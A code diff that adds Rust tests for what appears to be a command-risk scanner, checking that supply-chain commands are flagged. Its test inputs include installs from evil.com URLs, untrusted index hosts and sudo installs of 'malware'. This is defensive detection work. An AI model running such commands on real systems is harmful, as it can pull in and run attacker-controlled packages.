@@ -570,4 +570,112 @@ mod tests {
             .iter()
             .any(|m| m.identifier == "destructive_kubectl_delete_all"));
     }
+
+    // --- Supply chain rules ---
+
+    #[test]
+    fn detects_pip_install_from_url() {
+        for cmd in [
+            "pip install https://evil.com/package.tar.gz",
+            "pip3 install git+https://github.com/evil/package",
+        ] {
+            let ctx = scan(cmd);
+            assert!(
+                ctx.categories.contains("supply_chain"),
+                "expected supply_chain for {cmd:?}, got {:?}",
+                ctx.categories
+            );
+        }
+    }
+
+    #[test]
+    fn detects_npm_install_from_url() {
+        for cmd in [
+            "npm install https://evil.com/pkg.tgz",
+            "yarn add git+https://github.com/evil/pkg",
+        ] {
+            let ctx = scan(cmd);
+            assert!(
+                ctx.categories.contains("supply_chain"),
+                "expected supply_chain for {cmd:?}, got {:?}",
+                ctx.categories
+            );
+        }
+    }
+
+    #[test]
+    fn detects_cargo_install_git() {
+        let ctx = scan("cargo install --git https://github.com/evil/package");
+        assert!(ctx
+            .matches
+            .iter()
+            .any(|m| m.identifier == "supply_chain_cargo_install_git"));
+    }
+
+    #[test]
+    fn detects_package_publish() {
+        for cmd in [
+            "npm publish",
+            "cargo publish",
+            "twine upload dist/*",
+            "gem push my-gem-1.0.gem",
+        ] {
+            let ctx = scan(cmd);
+            assert!(
+                ctx.categories.contains("supply_chain"),
+                "expected supply_chain for {cmd:?}, got {:?}",
+                ctx.categories
+            );
+        }
+    }
+
+    #[test]
+    fn detects_pip_install_no_verify() {
+        for cmd in [
+            "pip install --trusted-host evil.com package",
+            "pip install --extra-index-url https://evil.com/simple package",
+        ] {
+            let ctx = scan(cmd);
+            assert!(
+                ctx.categories.contains("supply_chain"),
+                "expected supply_chain for {cmd:?}, got {:?}",
+                ctx.categories
+            );
+        }
+    }
+
+    #[test]
+    fn detects_global_install() {
+        for cmd in [
+            "npm install -g evil-package",
+            "sudo pip install malware",
+        ] {
+            let ctx = scan(cmd);
+            assert!(
+                ctx.categories.contains("supply_chain"),
+                "expected supply_chain for {cmd:?}, got {:?}",
+                ctx.categories
+            );
+        }
+    }
+
+    #[test]
+    fn detects_registry_override() {
+        let ctx = scan("[registries.my-internal]\nindex = \"https://internal.corp/crates\"");
+        assert!(ctx
+            .matches
+            .iter()
+            .any(|m| m.identifier == "supply_chain_registry_override"));
+    }
+
+    #[test]
+    fn safe_pip_install_not_flagged_as_supply_chain() {
+        // Normal pip install from PyPI should not trigger supply_chain
+        let ctx = scan("pip install requests");
+        assert!(
+            !ctx.categories.contains("supply_chain"),
+            "normal pip install should not trigger supply_chain, got {:?}",
+            ctx.matches.iter().map(|m| &m.identifier).collect::<Vec<_>>()
+        );
+    }
 }
